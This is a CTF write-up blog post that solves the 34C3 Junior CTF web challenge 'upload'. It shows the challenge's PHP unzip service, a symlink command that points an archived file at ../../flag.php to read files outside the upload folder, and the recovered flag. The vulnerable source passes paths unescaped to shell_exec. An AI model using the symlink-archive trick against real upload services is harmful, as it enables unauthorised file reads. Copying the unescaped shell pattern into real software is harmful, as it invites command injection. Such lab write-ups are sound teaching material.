---
layout:     post
title:      "34C3 Junior CTF - upload"
date:       2017-12-28 21:00:00
author:     "W3ndige"
permalink: /:title/
category: 'Write-Ups'
---

Today we're going to look into one of the challenges from ***34C3 Junior CTF***  called ***upload***.
  - Category: web
  - Difficulty: easy
  - Points: 48

{% highlight text %}
This is an useful service to unzip some files.

We added a flag for your convenience.
{% endhighlight %}

Let's take a look at source code.

{% highlight php %}
<?php
$UPLOADS = '/var/www/uploads/';
if(!empty($_FILES['uploaded_file'])) {
   $paths = scandir($UPLOADS);
   $now = time();
   foreach($paths as $path) {
       if ($path == '.') {
           continue;
       }
       $mtime = filemtime($UPLOADS . $path);
       if ($now - $mtime > 120) {
           shell_exec('rm -rf ' . $UPLOADS . $path);
       }
   }
   $path = $UPLOADS . uniqid('upl') . '/';
   if(!mkdir($path, 0777, true)) {
       die('mkdir failed');
   }
   $zip = $path . uniqid('zip');
   if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $zip)) {
       shell_exec('unzip -j -n ' . $zip . ' -d ' . $path);
       unlink($zip);
       header('Location: uploads/'. basename($path) . '/');
   } else {
       echo 'There was an error uploading the file, please try again!';
   }
} else {
?>
<!DOCTYPE html>
<html>
<head>
   <title>Upload your files</title>
</head>
<body>
<?php
   if (@$_GET['source']) {
       highlight_file(__FILE__);
   } else {
?>
   <form enctype="multipart/form-data" method="POST">
       <p>Upload your file</p>
       <input type="file" name="uploaded_file"></input><br />
       <input type="submit"></input>
   </form>
   <a href="?source=1">Show source</a>
</body>
</html>
<?php
   }
}
?>
{% endhighlight %}

The most important part is that the `shell_exec` function will use `unzip` tool, unpacking the archive that we uploaded. We have to somehow get to the flag, which is located in the main directory - `http://35.197.205.153/flag.php`. Firstly, we'll have to get 2 directories higher so `../../` should be essential.

After a while I found out that we can simply compress ***symlinks***, which will allow us to enter a file linked by the content of an archive. Let's create this file.

{% highlight bash %}
ln -s ../../flag.php ./symlink.txt
{% endhighlight %}

Now we're able to compress it and send to the web service.

{% highlight html %}
<html>
<head><title>Index of /uploads/upl5a46a1bef0d1f/</title></head>
<body bgcolor="white">
<h1>Index of /uploads/upl5a46a1bef0d1f/</h1><hr><pre><a href="../">../</a>
<a href="symlink.txt">symlink.txt</a>                                        27-Dec-2017 19:57                  48
</pre><hr></body>
</html>
{% endhighlight %}

After viewing the content of `symlink.txt`, we are provided with the content of `flag`.

{% highlight php %}
<?php
$flag = "34C3_unpack_th3_M1ss1ng_l!nk"
?>
{% endhighlight %}
